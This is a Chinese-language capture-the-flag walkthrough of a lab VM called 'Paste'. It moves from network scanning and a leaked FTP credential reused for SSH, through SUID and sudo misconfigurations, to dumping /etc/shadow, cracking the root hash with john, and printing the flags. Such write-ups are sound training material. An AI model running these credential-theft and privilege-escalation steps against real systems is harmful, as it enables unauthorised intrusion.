# 一、信息收集

## 1. 主机发现

在内网环境中，使用 arp-scan 扫描本地网络，发现存活主机。

```
#—(kali@kali)-[/mnt/hgfs/gx/x]
$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08 VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f VMware, Inc.
192.168.205.193 08:00:27:6a:e7:aa PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6 VMware, Inc.
```

目标主机 IP：192.168.205.193

## 2. 端口与服务扫描

使用 nmap 探测开放端口与服务。

```
┌─(kali@kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.193
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 23:24 EDT
Nmap scan report for 192.168.205.193
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

开放端口：FTP(21)、SSH(22)、HTTP(80)

# 二、初始访问

## 1. FTP 信息泄露

尝试访问 FTP，查看是否存在匿名/弱口令。

```
┌─(kali@kali)-[/mnt/hgfs/gx/x]
└─$ ftp 192.168.205.193
Connected to 192.168.205.193.
220 220 welcome to FTP Service Please use guest:guest to login
```

FTP 欢迎信息泄露凭据 guest:guest，测试登录：

```
Name (192.168.205.193:kali): guest
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
ftp> ls -la
...
dr-xr-xr-x 2 1001 1001 4096 Jul 13 05:12 .
...
ftp> mkdir test
550 Permission denied.
```

能登录但权限极低，无法上传/创建。

## 2. SSH 登录

考虑同口令可能适用 SSH，尝试登录：

```
┌─(kali@kali)-[/mnt/hgfs/gx/x]
└─$ ssh guest@192.168.205.193
guest@192.168.205.193's password:
...
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 17 23:32:23 2025 from 192.168.205.128
guest@Paste:~$ id
uid=1001(guest) gid=1001(guest) groups=1001(guest)
```

获得低权 Shell。

# 三、权限提升

## 1. 提权至 film 用户

查找 SUID 文件：

```
guest@Paste:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/local/bin/change
...
```

分析异常 SUID 程序：

```
guest@Paste:/opt$ strings /usr/local/bin/change
...
/var/www/html/password.log
Failed to open password file
...
chpasswd
Failed to execute chpasswd command
film
%s:%s
Password for %s successfully changed
...
```

关键信息：
- 读取 /var/www/html/password.log
- 调用 chpasswd
- 硬编码用户名 film

查看日志文件：

```
guest@Paste:/opt$ cat /var/www/html/password.log
42956292
```

推测该内容为 film 密码，切换用户：

```
guest@Paste:/opt$ su film
Password:
film@Paste:/opt$ id
uid=1002(film) gid=1002(film) groups=1002(film)
```

成功提权至 film。

## 2. 提权至 root

查看 sudo 权限：

```
film@Paste:/opt$ sudo -l
User film may run the following commands on Paste:
    (ALL) NOPASSWD: /usr/bin/paste
```

可无密码以 root 执行 /usr/bin/paste，可读任意文件。

读取 root flag：

```
film@Paste:/opt$ sudo /usr/bin/paste /root/root.txt
f1ag{root-6ab2177cfaffa72807624d043ecb6c13}
```

获取 root shell（可选）：
1) 读取 /etc/shadow

```
film@Paste:/opt$ sudo /usr/bin/paste /etc/shadow
root:$6$jJev7FIbmMhP8iVA$p1.bGLOCx5BsAzgCrbp/FgF56k6HXP0QFb5pCaZzAJ1N7qOhZjTJymyk9CMRbc8JGy5DXF1/BiwP9JEZ7o7mp0:20282:0:99999:7:::
...
```

2) 攻击机用 john 和 rockyou.txt 爆破

```
┌──(kali@kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
sexybitch! (root)
Session completed.
```

3) 切换 root

```
film@Paste:/opt$ su -
Password:
root@Paste:~# id
uid=0(root) gid=0(root) groups=0(root)
```

获得 root 权限。

## 3. 获取所有 Flag

```
root@Paste:~# cat /root/root.txt
f1ag{root-6ab2177cfaffa72807624d043ecb6c13}
root@Paste:~# cat /home/film/user.txt
f1ag{user-f307bc02d0f7e60e52d128a0c27b8e34}
```

